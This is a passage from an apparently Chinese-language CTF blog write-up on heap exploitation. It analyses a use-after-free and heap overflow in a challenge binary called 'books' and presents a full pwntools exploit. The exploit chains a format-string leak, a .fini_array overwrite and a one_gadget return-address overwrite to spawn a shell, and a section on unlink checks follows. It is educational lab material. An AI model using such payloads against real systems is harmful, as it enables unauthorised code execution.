+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall delete_order(void *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v2; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  free(a1);</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>delete_order函数中free堆块，free之后没有将堆块置为NULL，存在<strong>UAF</strong>。</p>
+<p>submit：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall submit(char *a1, const char *a2, const char *a3)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; &#x2F;&#x2F; rax</span><br><span class="line">  size_t v4; &#x2F;&#x2F; rax</span><br><span class="line">  unsigned __int64 v7; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  strcpy(a1, &quot;Order 1: &quot;);</span><br><span class="line">  v3 &#x3D; strlen(a2);</span><br><span class="line">  strncat(a1, a2, v3);</span><br><span class="line">  strcat(a1, &quot;\nOrder 2: &quot;);</span><br><span class="line">  v4 &#x3D; strlen(a3);</span><br><span class="line">  strncat(a1, a3, v4);</span><br><span class="line">  *(_WORD *)&amp;a1[strlen(a1)] &#x3D; &#39;\n&#39;;</span><br><span class="line">  return __readfsqword(0x28u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>submit函数是将order1和order2的内容通过strcat和strncat连接起来。因为order1和order2存在溢出，所以在submit中也<strong>存在溢出</strong>；</p>
+<p>通过溢出漏洞和UAF可以布置堆空间，伪造chunk；格式化字符串可以实现任意地址读写。程序在submit之后就直接退出了，而格式化字符串是在submit之后才出现的，因为不能预先知道system或者execve函数的地址，所以要先利用格式化字符串泄露地址，然后再利用格式化字符串写指定的地址，所以格式化字符串要利于两次，要让程序在main函数运行结束后再返回main函数执行。这里不能覆盖main函数的返回地址，因为堆溢出覆盖不到栈地址，而且不知道栈上的返回地址是多少，所以覆盖main函数的返回地址行不通。另外一种改变程序执行流程的方法是修改 .fini_array 数组，程序的执行流程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.init</span><br><span class="line">.init_array[0]</span><br><span class="line">.init_array[1]</span><br><span class="line">…</span><br><span class="line">.init_array[n]</span><br><span class="line">main</span><br><span class="line">.fini_array[n]</span><br><span class="line">…</span><br><span class="line">.fini_array[1]</span><br><span class="line">.fini_array[0]</span><br><span class="line">.fini</span><br></pre></td></tr></table></figure>
+<p>具体参考：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/</a></p>
+<p>可以在IDA中Ctrl+s查看程序的.fini_array段：</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227172331696.png"></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227172505830.png"></p>
+<p>.fini_array[]数组中只有一个数据项，可以通过格式化字符串修改.fini_array[0]中的内容为main函数的地址，就可以让main函数再运行一次，注意修改.fini_array只能执行一次main函数，这很好理解，因为程序只执行.fini_array[0]一次，将.fini_array[0]中的内容换成main函数的地址只是再执行一次main函数，执行完第二次main函数之后就执行.fini段中的代码。在第二次执行main函数的时候，才可以利用格式化字符串写第二次main函数的返回地址为system/execve/gadget的地址；</p>
+<p>要利用格式化字符串实现任意地址读写，需要满足两个条件，一是需要先将要读写的内容的地址放到栈上，在main函数中读取用户输入的选项时最多可以读取128bytes，可以将需要读写的地址通过这里的fgets函数读取到栈上，然后再利用格式化字符串漏洞实现任意地址读写；</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227173627196.png"></p>
+<p>二是需要构造格式化字符串并将它作为printf函数的参数，格式化字符串根据需要来构造，printf函数的参数是dest，所以需要将格式化字符串放入dest中；</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227174349704.png"></p>
+<p>因为dest是堆块，所以可以用之前的堆溢出向dest中写入格式化字符串；</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227175058455.png"></p>
+<p>但是有一个问题，如果直接利用edit_order1或者edit_order2的溢出功能修改dest中的内容之后，会有一个strcpy操作，会将之前写入dest的格式化字符串覆盖掉，所以不能在edit_order中向dest中写东西；</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227175611296.png"></p>
+<p>修改dest的内容除了上面说的代码之外，在submit中也可以修改dest。</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227180552324.png"></p>
+<p>之前分析在submit中也存在堆溢出，但是因为submit中使用的堆块(v5)是在dest之后申请的，所以有溢出也不能覆盖到dest中，这里需要想办法让后面malloc的0x140的堆块在dest之前，做法有两种，一种是先通过order1 chunk的溢出修改order2 chunk的size为0x151，然后freeorder2 chunk，再malloc(0x140)就可以让v5指向order2 chunk，这里要注意的是为了防止0x151的chunk和top chunk合并，以及绕过 Ptmalloc2 对next_chunk的检查，需要在0x151大小的chunk后面在使用溢出布置一个堆块；另一种做法是先通过释放order2 chunk，然后通过edit_order1修改free掉的order2 chunk的size为0x151，这样后面再malloc(0x140)也是可以得到order2 chunk；</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227182140669.png"></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227182333205.png"></p>
+<p>本文payload用的是第一种方法。</p>
+<p>submit函数将order1和order2中的内容连接起来放到v5中。因为通过溢出将order2 chunk size改为0x151，所以malloc的v5其实指向原先order2的地址，也就是v5和order2指向同一个地方。当先用strncat将order1中的内容放到v5中时，order2也就变成和v5一样的内容了，后面再用strncat连接order2时，就是v5和v5自己做连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;Order 1: &quot; + order1_chunk + &quot;\nOrder 2: &quot; + order2_chunk + &quot;\n&quot;</span><br><span class="line">连接后变为：</span><br><span class="line">&quot;Order 1: &quot; + order1_chunk + &quot;\nOrder 2: &quot; + &quot;Order 1: &quot; + order1_chunk + &quot;\nOrder 2: &quot; + &quot;\n&quot;</span><br></pre></td></tr></table></figure>
+<p>因为后面要覆盖dest，所以需要计算好order1 chunk的长度，让后面一个order1 chunk刚好落在dest中，然后只需要在order1 chunk中写入格式化字符串即可。</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227190419635.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size(&quot;Order 1: &quot; + order1_chunk + &quot;\nOrder 2: &quot; + &quot;Order 1: &quot;) &#x3D; 0x90</span><br><span class="line">size(order1_chunk) &#x3D; 0x90 - 0x1b &#x3D; 0x74</span><br></pre></td></tr></table></figure>
+<p>所以order1_chunk中有0x74的空间可以用来写格式化字符串，写不满可以用其他非0字符填充。</p>
+<p><strong>漏洞利用：</strong></p>
+<p>结合上面的分析可以得出利用过程：</p>
+<ol>
+<li> 先edit_order1修改order2 chunk的size，并布置好堆，将格式化字符串写入order1_chunk，然后delete order2，再submit，利用格式化字符串泄露libc地址和栈地址并修改.fini_array[0]为main函数的地址；</li>
+<li> 根据泄露的libc地址和栈地址分别计算出libc基址和第二次运行main函数的返回地址，第二次运行main函数，重新布置堆空间，写入格式化字符串，修改返回地址为libc中execve的地址。为什么是execve，因为利用<a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">one_gadget</a>工具可以找到libc中execve(/bin/sh)的代码，直接覆盖返回地址，不需要在寄存器或者栈上布置参数。</li>
+</ol>
+<p><strong>第一步：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># first step</span><br><span class="line">fini_array &#x3D; 0x6011B8</span><br><span class="line">main_addr &#x3D; 0x400A39</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;%&quot; + str(0xA39) + &quot;c%13$hn&quot; + &#39;~%31$p&#39; + &#39;,%28$p&#39;</span><br><span class="line">payload &#x3D; payload.ljust(0x74, &#39;a&#39;)</span><br><span class="line">payload &#x3D; payload.ljust(0x80, &#39;\x00&#39;) # 填满整个order1 chunk</span><br><span class="line">payload +&#x3D; p64(0) # 填充order2 chunk的prev_size</span><br><span class="line">payload +&#x3D; p64(0x151) # 填充order2 chunk的size</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 0x140</span><br><span class="line">payload +&#x3D; p64(0)              </span><br><span class="line">payload +&#x3D; p64(0x21) # 为了bypass the check: !prev_inuse(next_chunk) </span><br><span class="line">payload +&#x3D; &#39;a&#39; * 0x10 </span><br><span class="line">payload +&#x3D; p64(0x20)+p64(0x21) # 为了使0x150的块不和nextchunk合并</span><br><span class="line"></span><br><span class="line">edit_order1(payload)</span><br><span class="line">delete_order2()</span><br><span class="line">submit(&#39;a&#39; * 7 + p64(fini_array))</span><br></pre></td></tr></table></figure>
+<p>通过调试可以得知用户输入的选项是格式化字符串的第12个参数：</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227204332928.png"></p>
+<p>所以<code>submit(&#39;a&#39; * 7 + p64(fini_array))</code>将格式化字符串的第12个参数用<code>5aaaaaaa</code>填满，然后将fini_array的地址放到第13个参数上，再使用<code>&quot;%&quot; + str(0xA39) + &quot;c%13$hn&quot;</code>来修改fini_array中的内容为main函数的地址。<code>%31$p</code>是泄露[__libc_start_main+240]的地址，<code>~</code>是分隔符，方便后面接收泄露的地址。<code>%28$p</code>是泄露栈地址，因为在后面需要覆盖main函数的返回地址，返回地址存放到栈上，所以需要获取返回地址存放的栈地址才能利用格式化字符串去修改它，获取泄露的栈地址之后，通过提前调试计算返回地址所在的栈地址和泄露的栈地址之间的差值，就可以通过泄露的栈地址得到返回地址，这么做的原理是程序中的代码对栈的操作都是固定的，一旦程序的执行流程确定，那么在程序正常运行的情况下栈空间的变化是固定的。</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227210041958.png"></p>
+<p>为什么泄露的栈地址是格式化字符串的第28个参数？</p>
+<p>这个不是固定的，也可以泄露其他值，有个原则是在第二运行main函数之后，泄露的栈地址还在栈上，这样的话计算其和返回地址之间的差值会方便一些。在第一步的payload中可以先不加<code>&#39;,%28$p&#39;</code>，等后面调试的时候再确定泄露的栈地址。因为所有需要的值都要在第一次运行main函数的过程中泄露，所以栈地址需要在这里泄露。先不加<code>&#39;,%28$p&#39;</code>调试，查看第二次运行main函数返回地址（第二次运行main函数exp可以先直接submit）：</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227213354654.png"></p>
+<p>返回地址所在的栈地址为0x7fffb2ea8668。通过对比第一次运行完main和第二次运行完main的栈空间，发现在栈地址0x7fffb2ea87b8 —▸ 0x7fffb2ea8850处，存放着栈地址0x7fffb2ea8850，而且在两次运行完main之后这个地址都在，所以它在第一、二次运行main的过程中不会变，这个栈地址可以用来泄露，调试可以发现这个地址正是之前第一次运行main函数是格式化字符串的第28个参数，所以可以使用<code>%28$p</code>来泄露。通过栈地址和返回地址可以计算出它们之间的差值为0x1e8。</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227213119586.png"></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227213243557.png"></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227214713462.png"></p>
+<p>exp后面<code>edit_order1(payload)</code>发送payload，<code>delete_order2()</code> free order2，<code>submit(&#39;a&#39; * 7 + p64(fini_array))</code>将要修改的fini_array的地址布置到栈上。</p>
+<p><strong>第二步：</strong></p>
+<p>通过第一步泄露的地址可以得到libc基址和第二次运行main的返回地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(&quot;~&quot;)</span><br><span class="line">io.recvuntil(&quot;~&quot;)</span><br><span class="line">io.recvuntil(&quot;~&quot;)</span><br><span class="line">libc_start_main_addr &#x3D; io.recv(14) # [__libc_start_main+240]&#39;s address</span><br><span class="line">io.recvuntil(&quot;,&quot;)</span><br><span class="line">stack_addr &#x3D; io.recv(14)</span><br><span class="line">libc_base &#x3D; int(libc_start_main_addr, 16) - libc.symbols[&#39;__libc_start_main&#39;] - 240</span><br><span class="line">print hex(libc_base)</span><br><span class="line">print hex(int(stack_addr, 16))</span><br><span class="line">ret_addr &#x3D; int(stack_addr, 16) - 0x1e8 # 第二次运行main函数的返回地址</span><br></pre></td></tr></table></figure>
+<img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227214258550.png" style="zoom:200%;">
+
+<p>有了libc基址就可以得到execve(“/bin/sh”)地址，可以使用<a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">one_gadget</a>工具查找execve(“/bin/sh”)在libc中的偏移：</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227215132090.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">execve_addr &#x3D; libc_base + 0x45226 # one_gadget &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</span><br><span class="line">print hex(execve_addr) </span><br><span class="line"># execve的地址分开写入到返回地址所在的空间</span><br><span class="line">execve_addr_lowest_byte &#x3D; execve_addr &amp; 0xff # execve地址的最低一个字节</span><br><span class="line">execve_addr_low_nd2rd_bytes &#x3D; (execve_addr &amp; 0xffff00) &gt;&gt; 8 # execve地址的低2，3两个字节</span><br><span class="line">print hex(execve_addr_lowest_byte)</span><br><span class="line">print hex(execve_addr_low_nd2rd_bytes)</span><br></pre></td></tr></table></figure>
+<p>因为经过调试发现execve地址和返回地址的低三个字节不相同，所以只需要覆盖返回地址的低三个字节即可。如果直接使用%$n覆盖低4个字节，速度会很慢而且程序可能会崩溃，所以最多使用%$hn覆盖两个字节，这里可以先使用%$hhn覆盖最低的一个字节，然后第二、三低的字节用%hn覆盖，注意如果2+1的话顺序不可以反过来，因为如果先覆盖低两个字节，%xhn中的x就是两个字节的数，然后再使用%$yhhn覆盖第三低字节，y只能是一个字节，前面已经打印出了x（两个字节）个字符，超过y的值导致后面覆盖的一个字节不成功。所以先覆盖一个字节，再覆盖两个字节，第二次覆盖的时候y要减去第一次输出的x个字符。</p>
+<p>接下来就是利用格式化字符串修改返回地址为execve函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;%&quot; + str(execve_addr_lowest_byte) + &quot;c%13$hhn&quot; # 写入execve_addr_lowest_byte</span><br><span class="line"># 写入execve_addr_low_nd2rd_bytes</span><br><span class="line">payload +&#x3D; &quot;%&quot; + str(execve_addr_low_nd2rd_bytes - execve_addr_lowest_byte) + &quot;c%14$hn&quot; </span><br><span class="line">payload &#x3D; payload.ljust(0x74, &#39;a&#39;)</span><br><span class="line"># 重新布置堆空间</span><br><span class="line">payload &#x3D; payload.ljust(0x80, &#39;\x00&#39;) # 填满整个order1 chunk</span><br><span class="line">payload +&#x3D; p64(0) # 填充order2 chunk的prev_size</span><br><span class="line">payload +&#x3D; p64(0x151) # 填充order2 chunk的size</span><br><span class="line">payload +&#x3D; &#39;a&#39;*0x140</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0x21) # 为了bypass the check: !prev_inuse(next_chunk)</span><br><span class="line">payload +&#x3D; &#39;a&#39;*0x10</span><br><span class="line">payload +&#x3D; p64(0x20)+p64(0x21) # 为了使0x150的块不和nextchunk合并</span><br><span class="line"></span><br><span class="line">edit_order1(payload)</span><br><span class="line">delete_order2()</span><br><span class="line">submit(&#39;a&#39; * 7 + p64(ret_addr) + p64(ret_addr + 1)) </span><br></pre></td></tr></table></figure>
+<p>exp重新布置堆空间，<code>c%13$hhn</code>和之前说的一样，是格式化字符串的第13个参数。<code>submit(&#39;a&#39; * 7 + p64(ret_addr) + p64(ret_addr + 1)) </code>中将ret_addr放到格式化字符串的第13个参数处，覆盖一个字节后，再从ret_addr + 1处开始覆盖两个字节。</p>
+<p><strong>exp：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">io &#x3D; process(&quot;.&#x2F;books&quot;)</span><br><span class="line">#io &#x3D; gdb.debug([&quot;.&#x2F;books&quot;], &quot;b *0x400C4A&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def edit_order1(order1):</span><br><span class="line">	io.sendlineafter(&quot;5: Submit\n&quot;, str(1))</span><br><span class="line">	io.sendlineafter(&quot;Enter first order:\n&quot;, order1)</span><br><span class="line"></span><br><span class="line">def edit_order2(order2):</span><br><span class="line">        io.sendlineafter(&quot;5: Submit\n&quot;, str(2))</span><br><span class="line">        io.sendlineafter(&quot;Enter second order:\n&quot;, order2)</span><br><span class="line"></span><br><span class="line">def delete_order1():</span><br><span class="line">	io.sendlineafter(&quot;5: Submit\n&quot;, str(3))</span><br><span class="line"></span><br><span class="line">def delete_order2():</span><br><span class="line">        io.sendlineafter(&quot;5: Submit\n&quot;, str(4))</span><br><span class="line"></span><br><span class="line">def submit(payload):</span><br><span class="line">        io.sendlineafter(&quot;5: Submit\n&quot;, &quot;5&quot; + payload)</span><br><span class="line"></span><br><span class="line"># first step</span><br><span class="line">fini_array &#x3D; 0x6011B8</span><br><span class="line">main_addr &#x3D; 0x400A39</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;%&quot; + str(0xA39) + &quot;c%13$hn&quot; + &#39;~%31$p&#39; + &#39;,%28$p&#39;</span><br><span class="line">payload &#x3D; payload.ljust(0x74, &#39;a&#39;)</span><br><span class="line">payload &#x3D; payload.ljust(0x80, &#39;\x00&#39;) # 填满整个order1 chunk</span><br><span class="line">payload +&#x3D; p64(0) # 填充order2 chunk的prev_size</span><br><span class="line">payload +&#x3D; p64(0x151) # 填充order2 chunk的size</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 0x140</span><br><span class="line">payload +&#x3D; p64(0)              </span><br><span class="line">payload +&#x3D; p64(0x21) # 为了bypass the check: !prev_inuse(next_chunk) </span><br><span class="line">payload +&#x3D; &#39;a&#39; * 0x10 </span><br><span class="line">payload +&#x3D; p64(0x20)+p64(0x21) # 为了使0x150的块不和nextchunk合并</span><br><span class="line"></span><br><span class="line">edit_order1(payload)</span><br><span class="line">delete_order2()</span><br><span class="line">submit(&#39;a&#39; * 7 + p64(fini_array))</span><br><span class="line"></span><br><span class="line"># 接收泄露的返回地址和栈地址</span><br><span class="line">io.recvuntil(&quot;~&quot;)</span><br><span class="line">io.recvuntil(&quot;~&quot;)</span><br><span class="line">io.recvuntil(&quot;~&quot;)</span><br><span class="line">libc_start_main_addr &#x3D; io.recv(14) # [__libc_start_main+240]&#39;s address</span><br><span class="line">io.recvuntil(&quot;,&quot;)</span><br><span class="line">stack_addr &#x3D; io.recv(14)</span><br><span class="line">libc_base &#x3D; int(libc_start_main_addr, 16) - libc.symbols[&#39;__libc_start_main&#39;] - 240</span><br><span class="line">print hex(libc_base)</span><br><span class="line">print hex(int(stack_addr, 16))</span><br><span class="line"></span><br><span class="line"># second step</span><br><span class="line">ret_addr &#x3D; int(stack_addr, 16) - 0x1e8 # 第二次运行main函数的返回地址</span><br><span class="line"></span><br><span class="line">execve_addr &#x3D; libc_base + 0x45226 # one_gadget &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</span><br><span class="line">print hex(execve_addr) </span><br><span class="line"># execve的地址分开写入到返回地址所在的空间</span><br><span class="line">execve_addr_lowest_byte &#x3D; execve_addr &amp; 0xff # execve地址的最低一个字节</span><br><span class="line">execve_addr_low_nd2rd_bytes &#x3D; (execve_addr &amp; 0xffff00) &gt;&gt; 8 # execve地址的低2，3两个字节</span><br><span class="line">print hex(execve_addr_lowest_byte)</span><br><span class="line">print hex(execve_addr_low_nd2rd_bytes)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;%&quot; + str(execve_addr_lowest_byte) + &quot;c%13$hhn&quot; # 写入execve_addr_lowest_byte</span><br><span class="line"># 写入execve_addr_low_nd2rd_bytes</span><br><span class="line">payload +&#x3D; &quot;%&quot; + str(execve_addr_low_nd2rd_bytes - execve_addr_lowest_byte) + &quot;c%14$hn&quot; </span><br><span class="line">payload &#x3D; payload.ljust(0x74, &#39;a&#39;)</span><br><span class="line"># 重新布置堆空间</span><br><span class="line">payload &#x3D; payload.ljust(0x80, &#39;\x00&#39;) # 填满整个order1 chunk</span><br><span class="line">payload +&#x3D; p64(0) # 填充order2 chunk的prev_size</span><br><span class="line">payload +&#x3D; p64(0x151) # 填充order2 chunk的size</span><br><span class="line">payload +&#x3D; &#39;a&#39;*0x140</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0x21) # 为了bypass the check: !prev_inuse(next_chunk)</span><br><span class="line">payload +&#x3D; &#39;a&#39;*0x10</span><br><span class="line">payload +&#x3D; p64(0x20)+p64(0x21) # 为了使0x150的块不和nextchunk合并</span><br><span class="line"></span><br><span class="line">edit_order1(payload)</span><br><span class="line">delete_order2()</span><br><span class="line">submit(&#39;a&#39; * 7 + p64(ret_addr) + p64(ret_addr + 1)) </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227220827524.png"></p>
+<p>exp有可能打不成功，具体原因还不清楚，多试几次能成功。</p>
+<p><strong>参考链接：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-246783.htm">https://bbs.pediy.com/thread-246783.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43449190/article/details/89077783">https://blog.csdn.net/qq_43449190/article/details/89077783</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43092232/article/details/105085880">https://blog.csdn.net/weixin_43092232/article/details/105085880</a></p>
+<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p><strong>关于unlink：</strong></p>
+<p>unlink主要是为了实现两个相邻free chunk的合并。触发unlink的条件：</p>
+<ol>
+<li> 堆块free掉之后被放入到双向链表的bin中（unsorted bin，small bin，large bin），并且该free掉的堆块物理地址相邻的堆块也是出于free状态，触发unlink对这两个chunk进行合并（包括前向合并和后向合并）；先判断是否能前向合并（prev），然后再判断后向合并；</li>
+<li>  malloc_consolidate()将fast bin中释放的chunk整理到unsorted_bin中；</li>
+<li>  malloc()将unsorted中释放的chunk整理到small bin或者large bin中等。</li>
+</ol>
+<p>一般用户可控的触发unlink的情况就是free chunk，通过堆溢出重新布置堆空间，将要free掉的chunk的前一个或者后一个chunk修改为free状态（一般是修改next_chunk的prev_size位），也可以直接fake一个chunk，在free 该chunk的时候就会触发unlink。</p>
+<p>unlink的检查：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      </span><br><span class="line">	malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); </span><br></pre></td></tr></table></figure>
+<p>在unlink之前会对next_chunk的bk指针和prev_chunk的fd指针进行检查；并且会检查size和next_chunk的prev_size是否相同。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 检查一下其大小是否一致。</span><br><span class="line">if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      \</span><br><span class="line">	malloc_printerr (&quot;corrupted size vs. prev_size&quot;);  </span><br></pre></td></tr></table></figure>
+<p>绕过上面的检查：</p>
